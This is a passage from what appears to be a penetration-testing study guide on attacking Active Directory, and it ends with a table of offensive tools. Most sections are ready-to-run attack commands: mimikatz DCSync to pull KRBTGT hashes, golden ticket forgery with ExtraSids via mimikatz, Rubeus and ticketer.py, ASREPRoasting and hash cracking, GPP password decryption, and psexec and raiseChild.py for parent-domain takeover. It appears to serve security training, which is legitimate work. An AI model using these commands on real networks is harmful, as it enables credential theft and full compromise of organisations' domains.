```console
PS C:\zeropio> klist
```

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. We can get the NT hash for KRBTGT account, to create a *Golden Ticket* and establish persistence:
```console
PS C:\zeropio> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

## Miscellaneous Misconfigurations 

### Exchange Related Group Membership 

In a default AD, the group **Exchange Windows Permissions** is not listed as a protected group, members can write a DACL to the domain object, to exploit DCSync. The Exchange group **Organization Management** can access mailboxes of all domain users. Often, sysadmins are member of this group. This group also has control over the OU called **Microsoft Exchange Security Groups**, which contains the group **Exchange Windows Permissions**.

### PrivExchange 

tHE **PrivExchange** attack is a flaw in the Exchange Server **PushSubscription** feature. This allows any domain user with a mailbox to force the Exchange server to authenticate any host over HTTP. The Exchange service runs as SYSTEM and is over-privileged by default. 

### Printer Bug 

The **Printer Bug** is a flaw in MS\_RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. Any domain user can connect to the spool's named pipe with the **RpcOpenPrinter** method and use the **RpcRemoteFindFirstPrinterChangeNotificationEx** method to forche the server to authenticate to any host over SMB. The spooler run as SYSTEM and is installed by default in WIndows servers with Desktop Experience. 

This attack can leveraged to realy to LDAP and grant a account DCSync privileges to retrieve all passwords hashes from AD. The attack can also be used to relay LDAP authentication and gran **Resource-Based Constrained Delegation** (**RBCD**) privileges for the victim to a computer account under our control, giving privileges to authentication as any user on the victim's computer.

This [tool](https://github.com/cube0x0/Security-Assessment) could help us. First, enumerating MS-PRN Printer Bug:
```console
PS C:\zeropio> Import-Module .\SecurityAssessment.ps1
PS C:\zeropio> Get-SpoolStatus -ComputerName <COMPUTER NAME>.<DOMAIN>.LOCAL
```

### MS14-068 

This was a flaw in Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. The vulnerability alloed a forged PAC to be accepted by the KDC as legitimate. A fake PAC can be created, presenting a user as a member of the Domian Administrators or other privileged group. The Impacket or tools like [PyKEK](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) can help us exploiting it.

### Sniffing LDAP Credentials 

Many applications and printers store the LDAP credentials in their web admin console. These consoles are often weak or with default passwords. These credentials can be viewed in cleartext. The **test connection** function can also be used to gather credentials by changing the LDAP IP address to our attack host, and setting a netcat listener on LDAP port 389. More info [here](https://grimhacker.com/2018/03/09/just-a-printer/). 

### Enumerating DNS Records 

With tools like [adidnsdump](https://github.com/dirkjanm/adidnsdump) we can enumerate all DNS records in a domain, using a valid domain user account. By default, all users can lis the child objects of a DNS zone in an AD. More information [here](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump). 

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.
```console
zero@pio$ adidnsdump -u <DOMAIN>\\<USER> ldap://<DC IP> 
```

If we run with the `-r` flag, the tool will attempt to resolve unknown records by performing **A** query. 

### Password in Description Field 

Sometimes sensitive information is display in **Description** or **Notes** fields:
```console
PS C:\zeropio> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD\_NOTREQD Field 

Sometimes domain accounts can have the [passwd\_notreqd](https://ldapwiki.com/wiki/PASSWD_NOTREQD) field set in the userAccountControl. If this is set, the user is not subject to the password policy length (they can even have empty passwords). We can enumerate them:
```console
PS C:\zeropio> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts 

The **SYSVPOL** share can have sensitive data. Batch, VBSscript, PowerShell scripts... It is worth checking it.
```console
PS C:\zeropio> ls \\<COMPUTER NAME>\SYSVOL\<DOMAIN>.LOCAL\
```

We can use CrackMapExec and the `--local-auth` flag to test any credentials we found.

### Group Policy Preferences (GPP) Passwords 

When a new GPP is created, as well a xml file in SYSVOL share. THese file can include:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords

These files can contain an array of configuration data and defined passwords. The **cpassword** attribute, encrypted as AES-256 bit, can be decrypted as:
```console
zero@pio$ gpp-decrypt <CPASSWORD>
```

This GPP passwords can be found manually or by using [Get-GPPPasswords.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
```console
zero@pio$ crackmapexec smb -L | grep gpp
```

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. We can hunt for this using CrackMapExec with the gpp\_autologin module, or using the Get-GPPAutologon.ps1 script included in PowerSploit.
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -M gpp_autologin
```

### ASREPRoasting 

It is possible to obtain the TGT for any account with the **Do not requier Kerberos pre-authentication** enabled. ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. We can search the users with:
```console
PS C:\zeropio> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

If we found a user we can use Rubeus:
```console
PS C:\zeropio> .\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```

And then crack with mode **18200**:
```console
zero@pio$ hashcat -m 18200 <HASH> <WORDLIST>
```

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication:
```console
zero@pio$ kerbrute userenum -d <DOMAIN>.local --dc <DC IP> <WORDLIST>
```

We can use now [Get-NPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py) to hunt all users with Kerberoast pre-authentication not required:
```console
zero@pio$ GetNPUsers.py <DOMAIN>.LOCAL/ -dc-ip <DC IP> -no-pass -usersfile valid_ad_users 
```

### Group Policy Object (GPO) Abuse 

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment.  GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can use tools like [Group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon) or [PingCastle](https://www.pingcastle.com/) to enumerate them. Or PowerView:
```console
PS C:\zeropio> Get-DomainGPO |select displayname
```

If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets:
```console
PS C:\zeropio> Get-GPO -All | Select DisplayName
```

Now we cna check if a user we control has any rights over a GPO:
```console
PS C:\zeropio> $sid=Convert-NameToSid "Domain Users"
PS C:\zeropio> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Search by **WriteProperty** and **WriteDacl**. We can use GPO GUID to display the name of the GPO:
```console
PS C:\zeropio> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Some tools, like [SharpGOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) can help us.

---

# Domain Trusts Primer 

A  trust is used to establish forest-forest or domain-domain authentication, which allows users to access resources in another domain, outside of the main domain where their account resides. An organization can create various types of trusts:
- **Parent-child**
- **Cross-link**
- **External**
- **Tree-root**
- **Forest**
- **ESAE**

Trusts can be:
- **Transitive**: trust is extended to objects that the child domain trusts
- **Non-transitive**: the child domain itself is the only one trusted

Trusts can be set up in two directions:
- **One-way trust**
- **Bidirectional trust**

We can use the `Get-ADTrust` cmdlet to enumerate domain trust relationships:
```console
PS C:\zeropio> Import-Module activedirectory
PS C:\zeropio> Get-ADTrust -Filter *
```

After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist:
```console
PS C:\zeropio> Get-DomainTrust 
```

We can perform a trust mapping:
```console
PS C:\zeropio> Get-DomainTrustMapping
```

From here, we could begin performing enumeration across the trusts. For example, checking users in the child domain:
```console
PS C:\zeropio> Get-DomainUser -Domain <DOMAIN> | select SamAccountName
```

[Here](https://adsecurity.org/?p=1001) is a well-known list of SIDs.

# Attacking Domain Trust Parent-child

## From Windows

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios, when a user change between domains a a new SID history attribute will be added to the previous one, so the user can maintain their attributes. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging with this account all SIDs associated to that account will be added to the user's token.

The token is used to determinate the permissions. If the SID of a Domain Admin is added to the SID History, the account may be able to perform a DCSync and create a *Golden Ticket* or a Kerberos TGT.

### ExtraSids Attack - mimikatz 

This attack allows for the compromise of a parent domain once the chield domain has been compromised.

In the same AD forest, the sidHistory is respected due to the lack of SID Filtering protection. If a user in a child domian has in their sidHistory the **Enterprise Admins group**, it will have administrative access to the entire forest. So we need to leverage an account to the Enterprise Admin rights. To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (don't need to exist)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
- With this data collected, the attack can be performed with Mimikatz

First, obtian the NT hash for the KRBTGT account. This account is used to encrypt/sign all Kerberos tickets. This is also knwon as the Golden Ticket attack. Since we have compromised the child domain, we can log as Domain Admin and perform the DCSync attack:
```console
PS C:\zeropio>  mimikatz # lsadump::dcsync /user:<CHILD DOMAIN>\krbtgt
```

We can use the PowerView Get-DomainSID function to get the SID for the child domain:
```console
PS C:\zeropio> Get-DomainSID
```

Next, we can obtian the SID for the Enterprise Admin group in the parent domain:
```console
PS C:\zeropio> Get-DomainGroup -Domain <PARENTDOMAIN>.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

At this point we have:
- the KRBTGT hash for the child domain
- the SID for the child domain
- a name of a user for the Golden Ticket (doesn't need to exist)
- the FQDN of the chield domain
- the SID of the Enterprise Admin group of the root domain.

Before starting the attack, confirm no access to the file system of the DC in the parent domain:
```console
PS C:\zeropio> ls \\<DC COMPUTER NAME>.<PARENT DOMAIN>.local\c$
```

Using mimikatz we can start:
```console
PS C:\zeropio> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:<CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /krbtgt:<KRBTGT HASH CHILD DOMAIN> /sids:<ENTERPRISE ADMIN ROOT DOMAIN SID> /ptt
```

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory:
```console
PS C:\zeropio> klist

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
```

From here, it is possible to access any resources within the parent domain:
```console
PS C:\zeropio> ls \\<DC COMPUTER NAME>.<PARENT DOMAIN>.local\c$
```

### ExtraSids Attack - Rubeus 

We can also perform the attack using Rubeus. Confirm that we cannot access the parent domain DC, as before. Using the data, we will use Rubeus:
```console
PS C:\htb>  .\Rubeus.exe golden /rc4:<KRBTGT HASH> /domain:<CHILD DOMAIN> /sid:<SID CHILD DOMAIN>  /sids:<ENTERPRISE ADMIN ROOT DOMAIN SID> /user:hacker /ptt
```

Once again, we can check that the ticket is in memory using the `klist` command.

### Performing a DCSync Attack 

We can perform a DCSync, targeting a Domain Admin user:
```console
PS C:\zeropio> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:<DOMAIN>\<USER>
```

## From Linux 

To do it in Linux, we will need the same information:
- the KRBTGT hash for the child domain
- the SID for the child domain
- a name of a user for the Golden Ticket (doesn't need to exist)
- the FQDN of the chield domain
- the SID of the Enterprise Admin group of the root domain.

Once we have control over the child domian, we can use **secretsdump.py** to DCSync and grab NTLM for KRBTGT:
```console
zero@pio$ secretsdump.py <CHILD DOMAIN>/<USER>@<IP> -just-dc-user <DOMAIN>/krbtgt
```

Now we can use [lookupsid.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py) to perform SID brute forcing to find the SID of the child domain. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format **DOMAIN_SID-RID**:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>/<USER>@<IP> 
```

We can filter out the noise by piping the command output to grep and looking for just the domain SID:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>.local/<USER>@<IP> | grep "Domain SID"
```

Now we can rerun the command targeting the parent domain to get the RID of the Enterprise Admin group:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>.local/<USER>@<IP> | grep -B12 "Enterprise Admins"
```

We have now all the data require to launch the attack. We can use [ticketer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ticketer.py) to execute the attack:
```console
zero@pio$ ticketer.py -nthash <KRBTGT HASH> -domain <CHILD DOMAIN>.LOCAL -domain-sid <CHILD DOMAIN SID> -extra-sid <PARENT DOMAIN SID> hacker
```

The ticket will be saved down to our system as a credential cache (ccache) file. Set the **KRB5CCNAME** environment variable:
```console
zero@pio$ export KRB5CCNAME=hacker.ccache 
```

We will use [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py) to authenticate to de DC:
```console
zero@pio$ psexec.py <CHILD DOMAIN>/hacker@<DC COMPUTER NAME>.<PARENT DOMAIN>.local -k -no-pass -target-ip <DC IP>
```

Impacket comes with [raiseChild.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/raiseChild.py), which will automatically escalate privileges. This will obtain everything by they own and execute it:
```console
zero@pio$ raiseChild.py -target-exec <DC IP> <CHILD DOMAIN>.LOCAL/<USER>
```

# Attacking Domain Trust Cross-Forest 

## From Windows 

Kerberos attacks (Kerberoasting or ASREPRoasting) can be performed across trust, depending on the trust direction. We can utilize PowerView to enumerate accounts in the target domain with SPNs associated to them:
```console
PS C:\zeropio> Get-DomainUser -SPN -Domain <DOMAIN> | select SamAccountName
```

If we see an account with an SPN, check the user to see their privileges:
```console
PS C:\zeropio> Get-DomainUser -Domain <DOMAIN> -Identity <USER> |select samaccountname,memberof
```

Let's perform a Kerberoasting attack across the trust using Rubeus. We can use the flag `/domain:` to do it:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /domain:<DOMAIN> /user:<USER> /nowrap
```

We can face a bidirectional forest trust managed by admins from the same company. It is worth checking for password reuse accross the two forest in this situation. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship.We can use the PowerView function `Get-DomainForeignGroupMember` to enumerate groups with users that do not belong to the domain:
```console
PS C:\zeropio> Get-DomainForeignGroupMember -Domain <DOMAIN>
```

We can now access other domains if we have the credential for one user:
```console
PS C:\htb> Enter-PSSession -ComputerName <COMPUTER NAME>.<DOMAIN>.LOCAL -CredentiaL <DOMAIN>\administrator
```

SID History can also be abused across a forest trust.

## From Linux 

We can perform this with **GetUserSPNs.py**, using the flag `-target-domain`:
```console
zero@pio$  GetUserSPNs.py -target-domain <DOMAIN 1> <TARGET DOMAIN>/<USER>
```

We can also use the `-request` to get all the hashes and to output to a file with `-outputfile <OUTPUT FILE>`. We can also use [BloodHound.py](https://github.com/fox-it/BloodHound.py). First, add the domain to the `/etc/resolv.conf`{: .filepath}:
```console
cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain <DOMAIN>.LOCAL
nameserver <DC IP>
```

Now we can run the tool as:
```console
zero@pio$ bloodhound-python -d <DOMAIN>.LOCAL -dc <DC COMPUTER NAME> -c All -u <USER> -p <PASSWORD>
```

We can compress to a zip for use it in the Bloodhound GUI as `zip -r <ZIP NAME>.zip *json`. Now we repeat the process for the other domain, changing the domain name in the `/etc/resolv.conf`{: .filepath} and the nameserver (IP of the DC). The bloodhound-python would look similar:
```console
zero@pio$ bloodhound-python -d <DOMAIN 2>.LOCAL -dc <DC 2 COMPUTER NAME> -c All -u <USER>@<DOMAIN 1>.local -p <PASSWORD>
```

---

# Resources

| **Link**   | **Description**    |
|--------------- | --------------- |
| **General** |
| [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | these tools can be used as replacements for various Windows `net*` commands and more |
| [Impacket](https://github.com/SecureAuthCorp/impacket) | Impacket is a collection of Python classes for working with network protocols |
| [Responder](https://github.com/lgandx/Responder) | LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication |
| [Inveigh.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1) | Similar to Responder |
| [C# Inveigh](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | C# version of Inveigh |
| [Hashcat](https://hashcat.net/hashcat/) | hash cracking and password recovery tool |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch) | built-in interface for interacting with the LDAP protocol |
| [smbserver.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts |
| [mssqlclient.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py) | provides the ability to interact with MSSQL databases |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) | parse the Group Policy Preferences XML file which extracts the username and decrypts the cpassword attribute |
| [PingCastle](https://www.pingcastle.com/documentation/) | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework |
| **Enumeration** |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Six Degrees of Domain Admin |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | data collector to gather information from AD |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) | A Python based ingestor for BloodHound |
| [Kerbrute](https://github.com/ropnop/kerbrute) | A tool to perform Kerberos pre-auth bruteforcing |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) (CME) | A swiss army knife for pentesting networks |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | A next generation version of enum4linux |
| [windapsearch](https://github.com/ropnop/windapsearch) | Python script to enumerate users, groups and computers from a Windows domain through LDAP queries |
| [SMBMap](https://github.com/ShawnDEvans/smbmap) | SMBMap is a handy SMB enumeration tool |
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Useful for finding information in Active Directory on computers with accessible file shares |
| [rpcdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py) |  RPC endpoint mapper |
| [ADIDNSdump](https://github.com/dirkjanm/adidnsdump) | Active Directory Integrated DNS dumping by any authenticated user |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | is an AD viewer and editor |
| [ADRecon](https://github.com/adrecon/ADRecon) | tool which gathers information about the Active Directory and generates a report  |
| **Attack** |
| [Rubeus](https://github.com/GhostPack/Rubeus) | tool built for Kerberos Abuse |
| [GetUserSPNs.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) | finding Service Principal names tied to normal users | 
| [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) | perform a password spray attack against users of a domain |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | Tool to audit and attack LAPS environments |
| [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py) | provides us with Psexec-like functionality in the form of a semi-interactive shell |
| [wmiexc.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/wmiexec.py) | provides the capability of command execution over WMI |
| [secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Adds, reads, modifies and deletes the Service Principal Names directory property for an Active Directory service account |
| [mimikatz](https://github.com/ParrotSec/mimikatz) | Performs many functions |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | The ultimate WinRM shell for hacking/pentesting |
| [noPac](https://github.com/Ridter/noPac) | Exploiting CVE-2021-42278 and CVE-2021-42287 |
| [CVE-2021-1675.py](https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py) | Printnightmare PoC |
| [ntlmrelayx.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py) | performs SMB relay attacks |
| [PetitPotam](https://github.com/topotam/PetitPotam) | PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions |
| [gettgtgpkinit.py](https://raw.githubusercontent.com/dirkjanm/PKINITtools/master/gettgtpkinit.py) | manipulating certificates and TGTs |
| [getnthash.py](https://raw.githubusercontent.com/dirkjanm/PKINITtools/master/getnthash.py) | use an existing TGT to request a PAC for the current user using U2U |
| [GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py) | perform the ASREPRoasting attack to list and obtain AS-REP hashes for users |
| [lookupsid.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py) | SID bruteforcing tool 1
| [ticketer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ticketer.py) | creation and customization of TGT/TGS tickets |
| [raiseChild.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/raiseChild.py) | automated child to parent domain privilege escalation | 
| [Group3r](https://github.com/Group3r/Group3r) | Find vulnerabilities in AD Group Policy 

